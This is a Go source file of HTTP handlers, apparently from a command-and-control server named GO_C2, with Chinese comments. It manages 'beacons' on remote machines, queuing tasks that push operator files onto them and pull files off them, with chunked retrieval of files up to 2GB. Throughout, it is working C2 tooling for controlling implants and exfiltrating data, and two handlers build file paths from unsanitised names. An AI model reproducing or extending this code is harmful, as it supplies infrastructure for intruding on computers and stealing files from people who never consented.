package handler

import (
    "fmt"
    "io"
    "net/http"
    "os"
    "path/filepath"
    "regexp"
    "strings"
    "time"
    "log"
    "strconv"

    "github.com/gin-gonic/gin"

    "GO_C2/db"
    "GO_C2/utils"
)

var invalidName = regexp.MustCompile(`[^a-zA-Z0-9._-]+`)

// 任务类型常量 - 从job.go中引用，避免重复定义
const (
    TASK_FILE_INFO = 0x26 // 新增：用于获取文件信息
)

func ensureStorageDir(uuid string) (string, error) {
    dir := filepath.Join("storage", uuid)
    if err := os.MkdirAll(dir, 0755); err != nil { return "", err }
    return dir, nil
}

func sanitizeFilename(name string) string {
    name = filepath.Base(name)
    if name == "." || name == "" { name = fmt.Sprintf("file_%d.bin", time.Now().Unix()) }
    name = invalidName.ReplaceAllString(name, "_")
    return name
}

// GetFileHandler 提供已保存文件的下载（需管理员已鉴权）
func GetFileHandler(c *gin.Context) {
    uuid := c.Param("uuid")
    filename := c.Param("filename")
    if uuid == "" || filename == "" { c.JSON(http.StatusBadRequest, gin.H{"error":"invalid params"}); return }
    dir := filepath.Join("storage", uuid)
    path := filepath.Join(dir, filepath.Base(filename))
    
    // 检查文件是否存在
    f, err := os.Open(path)
    if err != nil { c.JSON(http.StatusNotFound, gin.H{"error":"file not found"}); return }
    defer f.Close()
    
    // 获取文件信息
    stat, err := f.Stat()
    if err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error":"failed to get file info"}); return }
    
    // 设置响应头，强制浏览器下载
    c.Header("Content-Type", "application/octet-stream")
    c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filepath.Base(filename)))
    c.Header("Content-Length", fmt.Sprintf("%d", stat.Size()))
    c.Header("Cache-Control", "no-cache")
    
    // 使用c.File确保浏览器自动下载
    c.File(path)
}

// UploadToBeaconHandler 接收前端上传文件并为指定 Beacon 下发上传任务
// 表单字段：uuid, target_path, file
func UploadToBeaconHandler(c *gin.Context) {
    uuid := c.PostForm("uuid")
    targetPath := strings.TrimSpace(c.PostForm("target_path"))
    if uuid == "" || targetPath == "" { 
        c.JSON(http.StatusBadRequest, gin.H{"error":"uuid and target_path required"}); 
        return 
    }
    
    if file, header, err := c.Request.FormFile("file"); err == nil {
        defer file.Close()
        
        // 先确保 storage 目录存在
        dir, err := ensureStorageDir(uuid)
        if err != nil { 
            c.JSON(http.StatusInternalServerError, gin.H{"error":"failed to ensure storage dir"}); 
            return 
        }

        filename := sanitizeFilename(header.Filename)
        outPath := filepath.Join(dir, filename)

        // 直接保存完整文件到storage
        out, err := os.Create(outPath)
        if err != nil { 
            c.JSON(http.StatusInternalServerError, gin.H{"error":"create file failed"}); 
            return 
        }
        defer out.Close()
        if _, err := io.Copy(out, file); err != nil { 
            c.JSON(http.StatusInternalServerError, gin.H{"error":"save file failed"}); 
            return 
        }

        // 读取保存的文件并发送给beacon
        savedData, err := os.ReadFile(outPath)
        if err != nil { 
            c.JSON(http.StatusInternalServerError, gin.H{"error":"read saved file failed"}); 
            return 
        }
        
        // 对整个文件进行base64编码
        b64 := utils.CustomBase64Encode(savedData)

        // 拼装上传负载 - 使用标准格式：<path>\n<base64_data>
        payload := fmt.Sprintf("%s\n%s", targetPath, b64)
        jobData := string(append([]byte{TASK_FILE_UPLOAD}, []byte(payload)...))
        
        // 添加调试日志
        log.Printf("UploadToBeaconHandler: sending file upload task for uuid=%s, path=%s, data_size=%d, b64_length=%d", 
                  uuid, targetPath, len(savedData), len(b64))

        // 同时更新beacon任务和加入任务队列（确保beacon能收到任务）
        if err := db.UpdateBeaconJob(uuid, jobData); err != nil {
            log.Printf("UploadToBeaconHandler: UpdateBeaconJob failed for uuid=%s, err=%v", uuid, err)
            c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to schedule job", "detail": err.Error()})
            return
        }
        
        // 将任务也加入任务队列，确保beacon能通过队列机制获取到
        if err := db.AddTaskToQueue(uuid, TASK_FILE_UPLOAD, jobData, 0); err != nil {
            log.Printf("UploadToBeaconHandler: AddTaskToQueue failed for uuid=%s, err=%v", uuid, err)
            // 不返回错误，因为主要任务已经创建成功
        } else {
            log.Printf("UploadToBeaconHandler: task also added to queue for uuid=%s", uuid)
        }

        // 创建任务历史记录
        createTaskHistory(uuid, "Upload File", fmt.Sprintf("Upload file %s", header.Filename))
        _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Upload File", uuid)

        // 设置超时（增加到60秒）
        schedulePendingTimeout(uuid, "Upload File", fmt.Sprintf("Upload file %s", header.Filename))
        
        log.Printf("UploadToBeaconHandler: task scheduled successfully for uuid=%s, file=%s, timeout=60s", uuid, header.Filename)

        c.JSON(http.StatusOK, gin.H{"status":"success"})
        return
    }
    
    c.JSON(http.StatusBadRequest, gin.H{"error":"no file uploaded"})
}

// SendStorageFileToBeaconHandler 从 storage 读取文件并发送给 beacon
// 请求参数：uuid, filename, target_path
func SendStorageFileToBeaconHandler(c *gin.Context) {
    uuid := c.PostForm("uuid")
    filename := c.PostForm("filename")
    targetPath := strings.TrimSpace(c.PostForm("target_path"))
    if uuid == "" || filename == "" || targetPath == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "uuid, filename and target_path required"})
        return
    }

    // 从 storage 读取文件
    filePath := filepath.Join("storage", uuid, filename)
    fileData, err := os.ReadFile(filePath)
    if err != nil {
        c.JSON(http.StatusNotFound, gin.H{"error": "file not found in storage"})
        return
    }

    // Base64 编码
    b64 := utils.CustomBase64Encode(fileData)

    // 构造任务载荷 - 使用标准格式：<path>\n<base64_data>
    payload := fmt.Sprintf("%s\n%s", targetPath, b64)
    jobData := string(append([]byte{TASK_FILE_UPLOAD}, []byte(payload)...))
    
    // 添加调试日志
    log.Printf("SendStorageFileToBeaconHandler: sending file upload task for uuid=%s, path=%s, data_size=%d, b64_length=%d", 
              uuid, targetPath, len(fileData), len(b64))

    // 同时更新beacon任务和加入任务队列（确保beacon能收到任务）
    if err := db.UpdateBeaconJob(uuid, jobData); err != nil {
        log.Printf("SendStorageFileToBeaconHandler: UpdateBeaconJob failed for uuid=%s, err=%v, payload=%q", uuid, err, jobData)
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to schedule job", "detail": err.Error()})
        return
    }
    
    // 将任务也加入任务队列，确保beacon能通过队列机制获取到
    if err := db.AddTaskToQueue(uuid, TASK_FILE_UPLOAD, jobData, 0); err != nil {
        log.Printf("SendStorageFileToBeaconHandler: AddTaskToQueue failed for uuid=%s, err=%v", uuid, err)
        // 不返回错误，因为主要任务已经创建成功
    } else {
        log.Printf("SendStorageFileToBeaconHandler: task also added to queue for uuid=%s", uuid)
    }

    // 记录历史并设当前任务
    createTaskHistory(uuid, "Upload File", fmt.Sprintf("Upload storage file %s", filename))
    _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Upload File", uuid)

    c.JSON(http.StatusOK, gin.H{"status": "success", "message": "storage file sent to beacon"})
}

// DownloadFromBeaconHandler 从beacon下载文件到服务器（简化版）
func DownloadFromBeaconHandler(c *gin.Context) {
    uuid := c.PostForm("uuid")
    filePath := strings.TrimSpace(c.PostForm("file_path"))
    if uuid == "" || filePath == "" { 
        c.JSON(http.StatusBadRequest, gin.H{"error":"uuid and file_path required"})
        return 
    }
    
    // 简化：直接下载整个文件，不再支持分片
    payload := filePath
    
    jobData := string(append([]byte{TASK_FILE_DOWNLOAD}, []byte(payload)...))
    
    // 同时更新beacon任务和加入任务队列（确保beacon能收到任务）
    if err := db.UpdateBeaconJob(uuid, jobData); err != nil { 
        c.JSON(http.StatusInternalServerError, gin.H{"error":"schedule job failed"})
        return 
    }
    
    // 将任务也加入任务队列，确保beacon能通过队列机制获取到
    if err := db.AddTaskToQueue(uuid, TASK_FILE_DOWNLOAD, jobData, 0); err != nil {
        log.Printf("DownloadFromBeaconHandler: AddTaskToQueue failed for uuid=%s, err=%v", uuid, err)
        // 不返回错误，因为主要任务已经创建成功
    } else {
        log.Printf("DownloadFromBeaconHandler: task also added to queue for uuid=%s", uuid)
    }
    
    // 创建任务历史记录
    createTaskHistory(uuid, "Download File", fmt.Sprintf("Download file %s", filepath.Base(filePath)))
    _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Download File", uuid)
    
    // 设置超时（增加到60秒，避免大文件下载超时）
    schedulePendingTimeout(uuid, "Download File", fmt.Sprintf("Download file %s", filepath.Base(filePath)))
    
    log.Printf("DownloadFromBeaconHandler: download task scheduled for uuid=%s, file=%s, timeout=60s", uuid, filepath.Base(filePath))
    
    c.JSON(http.StatusOK, gin.H{"status":"success"})
}

// DownloadFileHandler 提供已下载文件的下载链接
func DownloadFileHandler(c *gin.Context) {
    uuid := c.Param("uuid")
    filename := c.Param("filename")
    
    if uuid == "" || filename == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "uuid and filename required"})
        return
    }
    
    // 验证UUID格式
    if !utils.ValidateUUID(uuid) {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid uuid format"})
        return
    }
    
    // 构建文件路径
    filePath := filepath.Join("storage", uuid, filename)
    
    // 检查文件是否存在
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        c.JSON(http.StatusNotFound, gin.H{"error": "file not found"})
        return
    }
    
    // 设置响应头，触发浏览器下载
    c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
    c.Header("Content-Type", "application/octet-stream")
    
    // 发送文件
    c.File(filePath)
    
    log.Printf("File download requested: uuid=%s, filename=%s, path=%s", uuid, filename, filePath)
}

// GetNextTaskHandler beacon主动拉取下一个任务
func GetNextTaskHandler(c *gin.Context) {
    uuid := c.PostForm("uuid")
    if uuid == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "uuid required"})
        return
    }
    
    // 获取下一个待处理任务
    task, err := db.GetNextPendingTask(uuid)
    if err != nil {
        // 没有待处理任务
        c.JSON(http.StatusOK, gin.H{"status": "no_task"})
        return
    }
    
    // 标记任务为处理中
    if err := db.MarkTaskAsProcessing(task.ID); err != nil {
        log.Printf("GetNextTaskHandler: MarkTaskAsProcessing failed for task=%d, err=%v", task.ID, err)
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to mark task as processing"})
        return
    }
    
    // 返回任务数据
    c.JSON(http.StatusOK, gin.H{
        "status": "success",
        "task_id": task.ID,
        "task_type": task.TaskType,
        "task_data": task.TaskData,
        "priority": task.Priority,
    })
}

// CompleteTaskHandler beacon确认任务完成
func CompleteTaskHandler(c *gin.Context) {
    uuid := c.PostForm("uuid")
    taskIDStr := c.PostForm("task_id")
    // result := c.PostForm("result") // 可选的结果数据，暂时未使用
    
    if uuid == "" || taskIDStr == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "uuid and task_id required"})
        return
    }
    
    taskID, err := strconv.ParseInt(taskIDStr, 10, 64)
    if err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task_id"})
        return
    }
    
    // 标记任务为完成
    if err := db.MarkTaskAsCompleted(taskID); err != nil {
        log.Printf("CompleteTaskHandler: MarkTaskAsCompleted failed for task=%d, err=%v", taskID, err)
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to mark task as completed"})
        return
    }
    
    // 文件上传任务完成后，beacon会自动请求下一个任务
    if task, err := db.GetNextPendingTask(uuid); err == nil && task != nil {
        if task.TaskType == TASK_FILE_UPLOAD {
            log.Printf("CompleteTaskHandler: beacon %s completed file upload task %d", uuid, taskID)
        }
    }
    
    c.JSON(http.StatusOK, gin.H{"status": "success"})
}



// 大文件下载支持 - 分块下载到服务器
const (
    DOWNLOAD_CHUNK_SIZE = 8 * 1024 * 1024 // 8MB 分块大小
    MAX_DOWNLOAD_SIZE   = 2 * 1024 * 1024 * 1024 // 2GB 最大下载大小
)

// DownloadLargeFileFromBeaconHandler 支持大文件分块下载
func DownloadLargeFileFromBeaconHandler(c *gin.Context) {
    uuid := c.PostForm("uuid")
    filePath := strings.TrimSpace(c.PostForm("file_path"))
    if uuid == "" || filePath == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "uuid and file_path required"})
        return
    }

    // 创建下载会话
    sessionID, err := db.CreateDownloadSession(uuid, filepath.Base(filePath), filePath)
    if err != nil {
        log.Printf("DownloadLargeFileFromBeaconHandler: CreateDownloadSession failed for uuid=%s, err=%v", uuid, err)
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create download session", "detail": err.Error()})
        return
    }

    // 检查文件大小（通过beacon获取文件信息）
    fileInfoRequest := fmt.Sprintf("FILE_INFO:%s", filePath)
    jobData := string(append([]byte{TASK_FILE_INFO}, []byte(fileInfoRequest)...))
    
    // 将任务加入队列而不是直接更新beacon.Job
    if err := db.AddTaskToQueue(uuid, TASK_FILE_INFO, jobData, 0); err != nil {
        log.Printf("DownloadLargeFileFromBeaconHandler: AddTaskToQueue failed for uuid=%s, err=%v", uuid, err)
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to queue file info job", "detail": err.Error()})
        return
    }

    // 创建任务历史记录
    createTaskHistory(uuid, "Download Large File", fmt.Sprintf("Download large file %s", filepath.Base(filePath)))
    _, _ = db.DB.Exec("UPDATE beacons SET current_task = ? WHERE uuid = ?", "Download Large File", uuid)

    c.JSON(http.StatusOK, gin.H{
        "status": "success",
        "message": "large file download initiated",
        "session_id": sessionID,
        "file_path": filePath,
    })
}

// GetDownloadProgressHandler 获取下载进度
func GetDownloadProgressHandler(c *gin.Context) {
    sessionIDStr := c.Query("session_id")
    if sessionIDStr == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "session_id required"})
        return
    }

    sessionID, err := strconv.ParseInt(sessionIDStr, 10, 64)
    if err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid session_id"})
        return
    }

    progress, err := db.GetDownloadProgress(sessionID)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to get progress", "detail": err.Error()})
        return
    }

    c.JSON(http.StatusOK, gin.H{
        "status": "success",
        "progress": progress,
    })
}

// DownloadFileChunkHandler 下载文件分块
func DownloadFileChunkHandler(c *gin.Context) {
    sessionIDStr := c.Query("session_id")
    chunkIndexStr := c.Query("chunk_index")
    
    if sessionIDStr == "" || chunkIndexStr == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "session_id and chunk_index required"})
        return
    }

    sessionID, err := strconv.ParseInt(sessionIDStr, 10, 64)
    if err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid session_id"})
        return
    }

    chunkIndex, err := strconv.Atoi(chunkIndexStr)
    if err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid chunk_index"})
        return
    }

    chunk, err := db.GetDownloadChunk(sessionID, chunkIndex)
    if err != nil {
        c.JSON(http.StatusNotFound, gin.H{"error": "chunk not found", "detail": err.Error()})
        return
    }

    // 解码Base64数据
    decodedData, err := utils.CustomBase64Decode(chunk.ChunkData)
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to decode chunk data", "detail": err.Error()})
        return
    }

    // 设置响应头
    c.Header("Content-Type", "application/octet-stream")
    c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=chunk_%d.bin", chunkIndex))
    c.Header("Content-Length", fmt.Sprintf("%d", len(decodedData)))
    c.Header("X-Chunk-Index", fmt.Sprintf("%d", chunk.ChunkIndex))
    c.Header("X-Chunk-Offset", fmt.Sprintf("%d", chunk.ChunkOffset))
    c.Header("X-Chunk-Size", fmt.Sprintf("%d", chunk.ChunkSize))

    c.Data(http.StatusOK, "application/octet-stream", decodedData)
}

// CompleteDownloadSessionHandler 完成下载会话
func CompleteDownloadSessionHandler(c *gin.Context) {
    sessionIDStr := c.PostForm("session_id")
    if sessionIDStr == "" {
        c.JSON(http.StatusBadRequest, gin.H{"error": "session_id required"})
        return
    }

    sessionID, err := strconv.ParseInt(sessionIDStr, 10, 64)
    if err != nil {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid session_id"})
        return
    }

    if err := db.CompleteDownloadSession(sessionID); err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to complete session", "detail": err.Error()})
        return
    }

    c.JSON(http.StatusOK, gin.H{
        "status": "success",
        "message": "download session completed",
    })
}